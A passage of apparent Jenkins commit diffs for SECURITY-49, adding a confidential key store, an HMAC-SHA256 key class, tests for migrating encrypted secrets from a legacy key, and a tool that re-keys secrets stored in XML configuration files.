        this.masterKey = Util.toAes128Key(masterSecret.readTrim());
    }

    /**
     * Persists the payload of {@link ConfidentialKey} to the disk.
     */
    @Override
    protected void store(ConfidentialKey key, byte[] payload) throws IOException {
        CipherOutputStream cos=null;
        FileOutputStream fos=null;
        try {
            Cipher sym = Secret.getCipher("AES");
            sym.init(Cipher.ENCRYPT_MODE, masterKey);
            cos = new CipherOutputStream(fos=new FileOutputStream(getFileFor(key)), sym);
            cos.write(payload);
            cos.write(MAGIC);
        } catch (GeneralSecurityException e) {
            throw new IOException2("Failed to persist the key: "+key.getId(),e);
        } finally {
            IOUtils.closeQuietly(cos);
            IOUtils.closeQuietly(fos);
        }
    }

    /**
     * Reverse operation of {@link #store(ConfidentialKey, byte[])}
     *
     * @return
     *      null the data has not been previously persisted.
     */
    @Override
    protected byte[] load(ConfidentialKey key) throws IOException {
        CipherInputStream cis=null;
        FileInputStream fis=null;
        try {
            File f = getFileFor(key);
            if (!f.exists())    return null;

            Cipher sym = Secret.getCipher("AES");
            sym.init(Cipher.DECRYPT_MODE, masterKey);
            cis = new CipherInputStream(fis=new FileInputStream(f), sym);
            byte[] bytes = IOUtils.toByteArray(cis);
            return verifyMagic(bytes);
        } catch (GeneralSecurityException e) {
            throw new IOException2("Failed to persist the key: "+key.getId(),e);
        } finally {
            IOUtils.closeQuietly(cis);
            IOUtils.closeQuietly(fis);
        }
    }

    /**
     * Verifies that the given byte[] has the MAGIC trailer, to verify the integrity of the decryption process.
     */
    private byte[] verifyMagic(byte[] payload) {
        int payloadLen = payload.length-MAGIC.length;
        if (payloadLen<0)   return null;    // obviously broken

        for (int i=0; i<MAGIC.length; i++) {
            if (payload[payloadLen+i]!=MAGIC[i])
                return null;    // broken
        }
        byte[] truncated = new byte[payloadLen];
        System.arraycopy(payload,0,truncated,0,truncated.length);
        return truncated;
    }

    private File getFileFor(ConfidentialKey key) {
        return new File(rootDir, key.getId());
    }

    public byte[] randomBytes(int size) {
        byte[] random = new byte[size];
        sr.nextBytes(random);
        return random;
    }

    private static final byte[] MAGIC = "::::MAGIC::::".getBytes();
}


--------------------
Filename: HMACConfidentialKey.java
Message: [SECURITY-49] Deprecating Jenkins.getSecretKey()

We are replacing it by the ConfidentialStore class and the
ConfidentialKey class, which provides purpose-specific confidential
information that are separated from each other.

In this way, not all eggs are in one basket, and in case of a
compromise, the impact will contained.

Also replaced several insecure use of digest(secret|messsage) or
digest(message|secret) by HMAC.

Diff: @@ -0,0 +1,144 @@
+package jenkins.security;
+
+import hudson.Util;
+
+import javax.crypto.KeyGenerator;
+import javax.crypto.Mac;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.SecretKeySpec;
+import java.io.IOException;
+import java.io.UnsupportedEncodingException;
+import java.security.GeneralSecurityException;
+import java.security.NoSuchAlgorithmException;
+import java.util.Arrays;
+
+/**
+ * {@link ConfidentialKey} that's used for creating a token by hashing some information with secret
+ * (such as <tt>hash(msg|secret)</tt>).
+ *
+ * <p>
+ * This provides more secure version of it by using HMAC.
+ * See http://rdist.root.org/2009/10/29/stop-using-unsafe-keyed-hashes-use-hmac/ for background.
+ * This implementation also never leaks the secret value to outside, so it makes it impossible
+ * for the careless caller to misuse the key (thus protecting ourselves from our own stupidity!)
+ *
+ * @author Kohsuke Kawaguchi
+ * @since 1.498
+ */
+public class HMACConfidentialKey extends ConfidentialKey {
+    private volatile SecretKey key;
+    private final int length;
+
+    /**
+     * @param length
+     *      Byte length of the HMAC code.
+     *      By default we use HMAC-SHA256, which produces 256bit (=32bytes) HMAC,
+     *      but if different use cases requires a shorter HMAC, specify the desired length here.
+     *      Note that when using {@link #mac(String)}, string encoding causes the length to double.
+     *      So if you want to get 16-letter HMAC, you specify 8 here.
+     */
+    public HMACConfidentialKey(String id, int length) {
+        super(id);
+        this.length = length;
+    }
+
+    /**
+     * Calls into {@link #HMACConfidentialKey(String, int)} with the longest possible HMAC length.
+     */
+    public HMACConfidentialKey(String id) {
+        this(id,Integer.MAX_VALUE);
+    }
+
+    /**
+     * Calls into {@link #HMACConfidentialKey(String, int)} by combining the class name and the shortName
+     * as the ID.
+     */
+    public HMACConfidentialKey(Class owner, String shortName, int length) {
+        this(owner.getName()+'.'+shortName,length);
+    }
+
+    public HMACConfidentialKey(Class owner, String shortName) {
+        this(owner,shortName,Integer.MAX_VALUE);
+    }
+
+
+    /**
+     * Computes the message authentication code for the specified byte sequence.
+     */
+    public byte[] mac(byte[] message) {
+        return chop(createMac().doFinal(message));
+    }
+
+    /**
+     * Convenience method for verifying the MAC code.
+     */
+    public boolean checkMac(byte[] message, byte[] mac) {
+        return Arrays.equals(mac(message),mac);
+    }
+
+    /**
+     * Computes the message authentication code and return it as a string.
+     * While redundant, often convenient.
+     */
+    public String mac(String message) {
+        try {
+            return Util.toHexString(mac(message.getBytes("UTF-8")));
+        } catch (UnsupportedEncodingException e) {
+            throw new AssertionError(e);
+        }
+    }
+
+    /**
+     * Verifies MAC constructed from {@link #mac(String)}
+     */
+    public boolean checkMac(String message, String mac) {
+        return mac(message).equals(mac);
+    }
+
+    private byte[] chop(byte[] mac) {
+        if (mac.length<=length)  return mac; // already too short
+
+        byte[] b = new byte[length];
+        System.arraycopy(mac,0,b,0,b.length);
+        return b;
+    }
+
+    /**
+     * Creates a new {@link Mac} object.
+     */
+    public Mac createMac() {
+        try {
+            Mac mac = Mac.getInstance(ALGORITHM);
+            mac.init(getKey());
+            return mac;
+        } catch (GeneralSecurityException e) {
+            // Javadoc says HmacSHA256 must be supported by every Java implementation.
+            throw new Error(ALGORITHM+" not supported?",e);
+        }
+    }
+
+    private SecretKey getKey() {
+        if (key==null) {
+            synchronized (this) {
+                if (key==null) {
+                    try {
+                        byte[] encoded = load();
+                        if (encoded==null) {
+                            KeyGenerator kg = KeyGenerator.getInstance(ALGORITHM);
+                            SecretKey key = kg.generateKey();
+                            store(encoded=key.getEncoded());
+                        }
+                        key = new SecretKeySpec(encoded,ALGORITHM);
+                    } catch (IOException e) {
+                        throw new Error("Failed to load the key: "+getId(),e);
+                    } catch (NoSuchAlgorithmException e) {
+                        throw new Error("Failed to load the key: "+getId(),e);
+                    }
+                }
+            }
+        }
+        return key;
+    }
+
+    private static final String ALGORITHM = "HmacSHA256";
+}

Code after:
package jenkins.security;

import hudson.Util;

import javax.crypto.KeyGenerator;
import javax.crypto.Mac;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.GeneralSecurityException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;

/**
 * {@link ConfidentialKey} that's used for creating a token by hashing some information with secret
 * (such as <tt>hash(msg|secret)</tt>).
 *
 * <p>
 * This provides more secure version of it by using HMAC.
 * See http://rdist.root.org/2009/10/29/stop-using-unsafe-keyed-hashes-use-hmac/ for background.
 * This implementation also never leaks the secret value to outside, so it makes it impossible
 * for the careless caller to misuse the key (thus protecting ourselves from our own stupidity!)
 *
 * @author Kohsuke Kawaguchi
 * @since 1.498
 */
public class HMACConfidentialKey extends ConfidentialKey {
    private volatile SecretKey key;
    private final int length;

    /**
     * @param length
     *      Byte length of the HMAC code.
     *      By default we use HMAC-SHA256, which produces 256bit (=32bytes) HMAC,
     *      but if different use cases requires a shorter HMAC, specify the desired length here.
     *      Note that when using {@link #mac(String)}, string encoding causes the length to double.
     *      So if you want to get 16-letter HMAC, you specify 8 here.
     */
    public HMACConfidentialKey(String id, int length) {
        super(id);
        this.length = length;
    }

    /**
     * Calls into {@link #HMACConfidentialKey(String, int)} with the longest possible HMAC length.
     */
    public HMACConfidentialKey(String id) {
        this(id,Integer.MAX_VALUE);
    }

    /**
     * Calls into {@link #HMACConfidentialKey(String, int)} by combining the class name and the shortName
     * as the ID.
     */
    public HMACConfidentialKey(Class owner, String shortName, int length) {
        this(owner.getName()+'.'+shortName,length);
    }

    public HMACConfidentialKey(Class owner, String shortName) {
        this(owner,shortName,Integer.MAX_VALUE);
    }


    /**
     * Computes the message authentication code for the specified byte sequence.
     */
    public byte[] mac(byte[] message) {
        return chop(createMac().doFinal(message));
    }

    /**
     * Convenience method for verifying the MAC code.
     */
    public boolean checkMac(byte[] message, byte[] mac) {
        return Arrays.equals(mac(message),mac);
    }

    /**
     * Computes the message authentication code and return it as a string.
     * While redundant, often convenient.
     */
    public String mac(String message) {
        try {
            return Util.toHexString(mac(message.getBytes("UTF-8")));
        } catch (UnsupportedEncodingException e) {
            throw new AssertionError(e);
        }
    }

    /**
     * Verifies MAC constructed from {@link #mac(String)}
     */
    public boolean checkMac(String message, String mac) {
        return mac(message).equals(mac);
    }

    private byte[] chop(byte[] mac) {
        if (mac.length<=length)  return mac; // already too short

        byte[] b = new byte[length];
        System.arraycopy(mac,0,b,0,b.length);
        return b;
    }

    /**
     * Creates a new {@link Mac} object.
     */
    public Mac createMac() {
        try {
            Mac mac = Mac.getInstance(ALGORITHM);
            mac.init(getKey());
            return mac;
        } catch (GeneralSecurityException e) {
            // Javadoc says HmacSHA256 must be supported by every Java implementation.
            throw new Error(ALGORITHM+" not supported?",e);
        }
    }

    private SecretKey getKey() {
        if (key==null) {
            synchronized (this) {
                if (key==null) {
                    try {
                        byte[] encoded = load();
                        if (encoded==null) {
                            KeyGenerator kg = KeyGenerator.getInstance(ALGORITHM);
                            SecretKey key = kg.generateKey();
                            store(encoded=key.getEncoded());
                        }
                        key = new SecretKeySpec(encoded,ALGORITHM);
                    } catch (IOException e) {
                        throw new Error("Failed to load the key: "+getId(),e);
                    } catch (NoSuchAlgorithmException e) {
                        throw new Error("Failed to load the key: "+getId(),e);
                    }
                }
            }
        }
        return key;
    }

    private static final String ALGORITHM = "HmacSHA256";
}


--------------------
Filename: SecretTest.groovy
Message: [SECURITY-49] Deprecating Jenkins.getSecretKey()

We are replacing it by the ConfidentialStore class and the
ConfidentialKey class, which provides purpose-specific confidential
information that are separated from each other.

In this way, not all eggs are in one basket, and in case of a
compromise, the impact will contained.

Also replaced several insecure use of digest(secret|messsage) or
digest(message|secret) by HMAC.

Diff: @@ -0,0 +1,119 @@
+/*
+ * The MIT License
+ * 
+ * Copyright (c) 2004-2010, Sun Microsystems, Inc., Kohsuke Kawaguchi
+ * 
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ * 
+ * The above copyright notice and this permission notice shall be included in
+ * all copies or substantial portions of the Software.
+ * 
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+ * THE SOFTWARE.
+ */
+package hudson.util
+
+import com.trilead.ssh2.crypto.Base64;
+import jenkins.model.Jenkins
+import jenkins.security.ConfidentialStoreRule;
+import org.junit.After
+import org.junit.Before
+import org.junit.Rule
+import org.junit.Test
+
+import javax.crypto.Cipher;
+import java.security.SecureRandom;
+
+import hudson.Util;
+
+/**
+ * @author Kohsuke Kawaguchi
+ */
+public class SecretTest {
+    @Rule
+    public ConfidentialStoreRule confidentialStore = new ConfidentialStoreRule()
+
+    @Test @Before
+    void setUp() {
+        def sr = new SecureRandom();
+        byte[] random = new byte[32];
+        sr.nextBytes(random);
+        Secret.SECRET = Util.toHexString(random);
+    }
+
+    @Test @After
+    void tearDown() {
+        Secret.SECRET = null;
+    }
+
+    @Test
+    void testEncrypt() {
+        def secret = Secret.fromString("abc");
+        assert "abc"==secret.plainText;
+
+        // make sure we got some encryption going
+        println secret.encryptedValue;
+        assert !"abc".equals(secret.encryptedValue);
+
+        // can we round trip?
+        assert secret==Secret.fromString(secret.encryptedValue);
+    }
+
+    @Test
+    void testDecrypt() {
+        assert "abc"==Secret.toString(Secret.fromString("abc"))
+    }
+
+    @Test
+    void testSerialization() {
+        def s = Secret.fromString("Mr.Jenkins");
+        def xml = Jenkins.XSTREAM.toXML(s);
+        assert !xml.contains(s.plainText)
+        assert xml.contains(s.encryptedValue)
+
+        def o = Jenkins.XSTREAM.fromXML(xml);
+        assert o==s : xml;
+    }
+
+    public static class Foo {
+        Secret password;
+    }
+
+    /**
+     * Makes sure the serialization form is backward compatible with String.
+     */
+    @Test
+    void testCompatibilityFromString() {
+        def tagName = Foo.class.name.replace("\$","_-");
+        def xml = "<$tagName><password>secret</password></$tagName>";
+        def foo = new Foo();
+        Jenkins.XSTREAM.fromXML(xml, foo);
+        assert "secret"==Secret.toString(foo.password)
+    }
+
+    /**
+     * Secret persisted with Jenkins.getSecretKey() should still decrypt OK.
+     */
+    @Test
+    void migrationFromLegacyKeyToConfidentialStore() {
+        def legacy = Secret.legacyKey
+        ["Hello world","","\u0000unprintable"].each { str ->
+            def cipher = Secret.getCipher("AES");
+            cipher.init(Cipher.ENCRYPT_MODE, legacy);
+            def old = new String(Base64.encode(cipher.doFinal((str + Secret.MAGIC).getBytes("UTF-8"))))
+            def s = Secret.fromString(old)
+            assert s.plainText==str : "secret by the old key should decrypt"
+            assert s.encryptedValue!=old : "but when encrypting, ConfidentialKey should be in use"
+        }
+    }
+}

Code after:
/*
 * The MIT License
 * 
 * Copyright (c) 2004-2010, Sun Microsystems, Inc., Kohsuke Kawaguchi
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package hudson.util

import com.trilead.ssh2.crypto.Base64;
import jenkins.model.Jenkins
import jenkins.security.ConfidentialStoreRule;
import org.junit.After
import org.junit.Before
import org.junit.Rule
import org.junit.Test

import javax.crypto.Cipher;
import java.security.SecureRandom;

import hudson.Util;

/**
 * @author Kohsuke Kawaguchi
 */
public class SecretTest {
    @Rule
    public ConfidentialStoreRule confidentialStore = new ConfidentialStoreRule()

    @Test @Before
    void setUp() {
        def sr = new SecureRandom();
        byte[] random = new byte[32];
        sr.nextBytes(random);
        Secret.SECRET = Util.toHexString(random);
    }

    @Test @After
    void tearDown() {
        Secret.SECRET = null;
    }

    @Test
    void testEncrypt() {
        def secret = Secret.fromString("abc");
        assert "abc"==secret.plainText;

        // make sure we got some encryption going
        println secret.encryptedValue;
        assert !"abc".equals(secret.encryptedValue);

        // can we round trip?
        assert secret==Secret.fromString(secret.encryptedValue);
    }

    @Test
    void testDecrypt() {
        assert "abc"==Secret.toString(Secret.fromString("abc"))
    }

    @Test
    void testSerialization() {
        def s = Secret.fromString("Mr.Jenkins");
        def xml = Jenkins.XSTREAM.toXML(s);
        assert !xml.contains(s.plainText)
        assert xml.contains(s.encryptedValue)

        def o = Jenkins.XSTREAM.fromXML(xml);
        assert o==s : xml;
    }

    public static class Foo {
        Secret password;
    }

    /**
     * Makes sure the serialization form is backward compatible with String.
     */
    @Test
    void testCompatibilityFromString() {
        def tagName = Foo.class.name.replace("\$","_-");
        def xml = "<$tagName><password>secret</password></$tagName>";
        def foo = new Foo();
        Jenkins.XSTREAM.fromXML(xml, foo);
        assert "secret"==Secret.toString(foo.password)
    }

    /**
     * Secret persisted with Jenkins.getSecretKey() should still decrypt OK.
     */
    @Test
    void migrationFromLegacyKeyToConfidentialStore() {
        def legacy = Secret.legacyKey
        ["Hello world","","\u0000unprintable"].each { str ->
            def cipher = Secret.getCipher("AES");
            cipher.init(Cipher.ENCRYPT_MODE, legacy);
            def old = new String(Base64.encode(cipher.doFinal((str + Secret.MAGIC).getBytes("UTF-8"))))
            def s = Secret.fromString(old)
            assert s.plainText==str : "secret by the old key should decrypt"
            assert s.encryptedValue!=old : "but when encrypting, ConfidentialKey should be in use"
        }
    }
}


--------------------
Filename: SecretRewriter.java
Message: [SECURITY-49] added a tool to re-key secrets

As an AdministrativeMonitor, it shows up in the manage Jenkins UI, and
allows the administrator to run a re-keying operation.

Diff: @@ -0,0 +1,223 @@
+package hudson.util;
+
+import com.trilead.ssh2.crypto.Base64;
+import hudson.model.TaskListener;
+import org.apache.commons.io.FileUtils;
+
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.security.GeneralSecurityException;
+import java.security.InvalidKeyException;
+import java.util.HashSet;
+import java.util.Set;
+
+/**
+ * Rewrites XML files by looking for Secrets that are stored with the old key and replaces them
+ * by the new encrypted values.
+ *
+ * @author Kohsuke Kawaguchi
+ */
+public class SecretRewriter {
+    private final Cipher cipher;
+    private final SecretKey key;
+
+    /**
+     * How many files have been scanned?
+     */
+    private int count;
+
+    /**
+     * If non-null the original file before rewrite gets in here.
+     */
+    private final File backupDirectory;
+
+    /**
+     * Canonical paths of the directories we are recursing to protect
+     * against symlink induced cycles.
+     */
+    private Set<String> callstack = new HashSet<String>();
+
+    public SecretRewriter(File backupDirectory) throws GeneralSecurityException {
+        cipher = Secret.getCipher("AES");
+        key = Secret.getLegacyKey();
+        this.backupDirectory = backupDirectory;
+    }
+
+    private String tryRewrite(String s) throws IOException, InvalidKeyException {
+        if (s.length()<24)
+            return s;   // Encrypting "" in Secret produces 24-letter characters, so this must be the minimum length
+        if (!isBase64(s))
+            return s;   // decode throws IOException if the input is not base64, and this is also a very quick way to filter
+
+        byte[] in;
+        try {
+            in = Base64.decode(s.toCharArray());
+        } catch (IOException e) {
+            return s;   // not a valid base64
+        }
+        cipher.init(Cipher.DECRYPT_MODE, key);
+        Secret sec = Secret.tryDecrypt(cipher, in);
+        if(sec!=null) // matched
+            return sec.getEncryptedValue(); // replace by the new encrypted value
+        else // not encrypted with the legacy key. leave it unmodified
+            return s;
+    }
+
+    /**
+     * @param backup
+     *      if non-null, the original file will be copied here before rewriting.
+     *      if the rewrite doesn't happen, no copying.
+     */
+    public boolean rewrite(File f, File backup) throws InvalidKeyException, IOException {
+        FileInputStream fin = new FileInputStream(f);
+        try {
+            BufferedReader r = new BufferedReader(new InputStreamReader(fin, "UTF-8"));
+            AtomicFileWriter w = new AtomicFileWriter(f, "UTF-8");
+            try {
+                PrintWriter out = new PrintWriter(new BufferedWriter(w));
+
+                boolean modified = false; // did we actually change anything?
+                try {
+                    String line;
+                    StringBuilder buf = new StringBuilder();
+
+                    while ((line=r.readLine())!=null) {
+                        int copied=0;
+                        buf.setLength(0);
+                        while (true) {
+                            int sidx = line.indexOf('>',copied);
+                            if (sidx<0) break;
+                            int eidx = line.indexOf('<',sidx);
+                            if (eidx<0) break;
+
+                            String elementText = line.substring(sidx+1,eidx);
+                            String replacement = tryRewrite(elementText);
+                            if (!replacement.equals(elementText))
+                                modified = true;
+
+                            buf.append(line.substring(copied,sidx+1));
+                            buf.append(replacement);
+                            copied = eidx;
+                        }
+                        buf.append(line.substring(copied));
+                        out.println(buf.toString());
+                    }
+                } finally {
+                    out.close();
+                }
+
+                if (modified) {
+                    if (backup!=null) {
+                        backup.getParentFile().mkdirs();
+                        FileUtils.copyFile(f,backup);
+                    }
+                    w.commit();
+                }
+                return modified;
+            } finally {
+                w.abort();
+            }
+        } finally {
+            fin.close();
+        }
+    }
+
+
+    /**
+     * Recursively scans and rewrites a directory.
+     *
+     * This method shouldn't abort just because one file fails to rewrite.
+     *
+     * @return
+     *      Number of files that were actually rewritten.
+     */
+    // synchronized to prevent accidental concurrent use. this instance is not thread safe
+    public synchronized int rewriteRecursive(File dir, TaskListener listener) throws InvalidKeyException {
+        return rewriteRecursive(dir,"",listener);
+    }
+    private int rewriteRecursive(File dir, String relative, TaskListener listener) throws InvalidKeyException {
+        String canonical;
+        try {
+            canonical = dir.getCanonicalPath();
+        } catch (IOException e) {
+            canonical = dir.getAbsolutePath(); //
+        }
+        if (!callstack.add(canonical)) {
+            listener.getLogger().println("Cycle detected: "+dir);
+            return 0;
+        }
+
+        try {
+            File[] children = dir.listFiles();
+            if (children==null)     return 0;
+
+            int rewritten=0;
+            for (File child : children) {
+                String cn = child.getName();
+                if (cn.endsWith(".xml")) {
+                    if ((count++)%100==0)
+                        listener.getLogger().println("Scanning "+child);
+                    try {
+                        File backup = null;
+                        if (backupDirectory!=null)  backup = new File(backupDirectory,relative+'/'+ cn);
+                        if (rewrite(child,backup)) {
+                            if (backup!=null)
+                                listener.getLogger().println("Copied "+child+" to "+backup+" as a backup");
+                            listener.getLogger().println("Rewritten "+child);
+                            rewritten++;
+                        }
+                    } catch (IOException e) {
+                        e.printStackTrace(listener.error("Failed to rewrite "+child));
+                    }
+                }
+                if (child.isDirectory()) {
+                    if (!isIgnoredDir(child))
+                        rewritten += rewriteRecursive(child,
+                                relative.length()==0 ? cn : relative+'/'+ cn,
+                                listener);
+                }
+            }
+            return rewritten;
+        } finally {
+            callstack.remove(canonical);
+        }
+    }
+
+    /**
+     * Decides if this directory is worth visiting or not.
+     */
+    protected boolean isIgnoredDir(File dir) {
+        // ignoring the workspace and the artifacts directories. Both of them
+        // are potentially large and they do not store any secrets.
+        String n = dir.getName();
+        return n.equals("workspace") || n.equals("artifacts")
+            || n.equals("plugins") // no mutable data here
+            || n.equals("jenkins.security.RekeySecretAdminMonitor") // we don't want to rewrite backups
+            || n.equals(".") || n.equals("..");
+    }
+
+    private static boolean isBase64(char ch) {
+        return 0<=ch && ch<128 && IS_BASE64[ch];
+    }
+
+    private static boolean isBase64(String s) {
+        for (int i=0; i<s.length(); i++)
+            if (!isBase64(s.charAt(i)))
+                return false;
+        return true;
+    }
+
+    private static final boolean[] IS_BASE64 = new boolean[128];
+    static {
+        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+        for (int i=0; i<chars.length();i++)
+            IS_BASE64[chars.charAt(i)] = true;
+    }
+}

Code after:
package hudson.util;

import com.trilead.ssh2.crypto.Base64;
import hudson.model.TaskListener;
import org.apache.commons.io.FileUtils;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.security.GeneralSecurityException;
import java.security.InvalidKeyException;
import java.util.HashSet;
import java.util.Set;

/**
 * Rewrites XML files by looking for Secrets that are stored with the old key and replaces them
 * by the new encrypted values.
 *
 * @author Kohsuke Kawaguchi
 */
public class SecretRewriter {
    private final Cipher cipher;
    private final SecretKey key;

    /**
     * How many files have been scanned?
     */
    private int count;

    /**
     * If non-null the original file before rewrite gets in here.
     */
    private final File backupDirectory;

    /**
     * Canonical paths of the directories we are recursing to protect
     * against symlink induced cycles.
     */
    private Set<String> callstack = new HashSet<String>();

    public SecretRewriter(File backupDirectory) throws GeneralSecurityException {
        cipher = Secret.getCipher("AES");
        key = Secret.getLegacyKey();
        this.backupDirectory = backupDirectory;
    }

    private String tryRewrite(String s) throws IOException, InvalidKeyException {
        if (s.length()<24)
            return s;   // Encrypting "" in Secret produces 24-letter characters, so this must be the minimum length
        if (!isBase64(s))
            return s;   // decode throws IOException if the input is not base64, and this is also a very quick way to filter

        byte[] in;
        try {
            in = Base64.decode(s.toCharArray());
        } catch (IOException e) {
            return s;   // not a valid base64
        }
        cipher.init(Cipher.DECRYPT_MODE, key);
        Secret sec = Secret.tryDecrypt(cipher, in);
        if(sec!=null) // matched
            return sec.getEncryptedValue(); // replace by the new encrypted value
        else // not encrypted with the legacy key. leave it unmodified
            return s;
    }

    /**
     * @param backup
     *      if non-null, the original file will be copied here before rewriting.
     *      if the rewrite doesn't happen, no copying.
     */
    public boolean rewrite(File f, File backup) throws InvalidKeyException, IOException {
        FileInputStream fin = new FileInputStream(f);
        try {
            BufferedReader r = new BufferedReader(new InputStreamReader(fin, "UTF-8"));
            AtomicFileWriter w = new AtomicFileWriter(f, "UTF-8");
            try {
                PrintWriter out = new PrintWriter(new BufferedWriter(w));

                boolean modified = false; // did we actually change anything?
                try {
                    String line;
                    StringBuilder buf = new StringBuilder();

                    while ((line=r.readLine())!=null) {
                        int copied=0;
                        buf.setLength(0);
                        while (true) {
                            int sidx = line.indexOf('>',copied);
                            if (sidx<0) break;
                            int eidx = line.indexOf('<',sidx);
                            if (eidx<0) break;

                            String elementText = line.substring(sidx+1,eidx);
                            String replacement = tryRewrite(elementText);
                            if (!replacement.equals(elementText))
                                modified = true;

                            buf.append(line.substring(copied,sidx+1));
                            buf.append(replacement);
                            copied = eidx;
                        }
                        buf.append(line.substring(copied));
                        out.println(buf.toString());
                    }
                } finally {
                    out.close();
                }

                if (modified) {
                    if (backup!=null) {
                        backup.getParentFile().mkdirs();
                        FileUtils.copyFile(f,backup);
                    }
                    w.commit();
                }
                return modified;
            } finally {
                w.abort();
            }
        } finally {
            fin.close();
        }
    }


    /**
     * Recursively scans and rewrites a directory.
     *
     * This method shouldn't abort just because one file fails to rewrite.
     *
     * @return
     *      Number of files that were actually rewritten.
     */
    // synchronized to prevent accidental concurrent use. this instance is not thread safe
    public synchronized int rewriteRecursive(File dir, TaskListener listener) throws InvalidKeyException {
        return rewriteRecursive(dir,"",listener);
    }
    private int rewriteRecursive(File dir, String relative, TaskListener listener) throws InvalidKeyException {
        String canonical;
        try {
            canonical = dir.getCanonicalPath();
        } catch (IOException e) {
            canonical = dir.getAbsolutePath(); //
        }
        if (!callstack.add(canonical)) {
            listener.getLogger().println("Cycle detected: "+dir);
            return 0;
        }

        try {
            File[] children = dir.listFiles();
            if (children==null)     return 0;

            int rewritten=0;
            for (File child : children) {
                String cn = child.getName();
                if (cn.endsWith(".xml")) {
                    if ((count++)%100==0)
                        listener.getLogger().println("Scanning "+child);
                    try {
                        File backup = null;
                        if (backupDirectory!=null)  backup = new File(backupDirectory,relative+'/'+ cn);
                        if (rewrite(child,backup)) {
                            if (backup!=null)
                                listener.getLogger().println("Copied "+child+" to "+backup+" as a backup");
                            listener.getLogger().println("Rewritten "+child);
                            rewritten++;
                        }
                    } catch (IOException e) {
                        e.printStackTrace(listener.error("Failed to rewrite "+child));
                    }
                }
                if (child.isDirectory()) {
                    if (!isIgnoredDir(child))
                        rewritten += rewriteRecursive(child,
                                relative.length()==0 ? cn : relative+'/'+ cn,
                                listener);
                }
            }
            return rewritten;
        } finally {
            callstack.remove(canonical);
        }
    }

    /**
     * Decides if this directory is worth visiting or not.
     */
    protected boolean isIgnoredDir(File dir) {
        // ignoring the workspace and the artifacts directories. Both of them
        // are potentially large and they do not store any secrets.
        String n = dir.getName();
        return n.equals("workspace") || n.equals("artifacts")
            || n.equals("plugins") // no mutable data here
            || n.equals("jenkins.security.RekeySecretAdminMonitor") // we don't want to rewrite backups
            || n.equals(".") || n.equals("..");
    }

    private static boolean isBase64(char ch) {
        return 0<=ch && ch<128 && IS_BASE64[ch];
    }

    private static boolean isBase64(String s) {
        for (int i=0; i<s.length(); i++)
            if (!isBase64(s.charAt(i)))
                return false;
        return true;
    }

    private static final boolean[] IS_BASE64 = new boolean[128];
    static {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        for (int i=0; i<chars.length();i++)
            IS_BASE64[chars.charAt(i)] = true;
    }
}


--------------------
Filename: RekeySecretAdminMonitor.java
Message: [SECURITY-49] added a tool to re-key secrets

As an AdministrativeMonitor, it shows up in the manage Jenkins UI, and
allows the administrator to run a re-keying operation.

Diff: @@ -0,0 +1,196 @@
+package jenkins.security;
+
+import hudson.Extension;
+import hudson.console.AnnotatedLargeText;
+import hudson.init.InitMilestone;
+import hudson.init.Initializer;
+import hudson.model.AdministrativeMonitor;
+import hudson.util.HttpResponses;
+import hudson.util.SecretRewriter;
+import hudson.util.StreamTaskListener;
+import hudson.util.VersionNumber;
+import jenkins.model.Jenkins;
+import jenkins.util.io.FileBoolean;
+import org.kohsuke.stapler.HttpResponse;
+import org.kohsuke.stapler.StaplerProxy;
+import org.kohsuke.stapler.StaplerRequest;
+import org.kohsuke.stapler.interceptor.RequirePOST;
+
+import java.io.File;
+import java.io.IOException;
+import java.io.PrintStream;
+import java.nio.charset.Charset;
+import java.security.GeneralSecurityException;
+import java.util.Date;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+
+/**
+ * Warns the administrator to run {@link SecretRewriter}
+ *
